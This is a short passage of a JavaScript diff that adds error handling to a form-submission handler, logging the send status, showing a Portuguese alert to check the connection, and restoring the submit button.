+        console.log("Status de envio:", err);
+        alert("Verifique sua conexão e tente novamente.");
         btn.innerHTML = originalText;
         btn.disabled = false;
       });
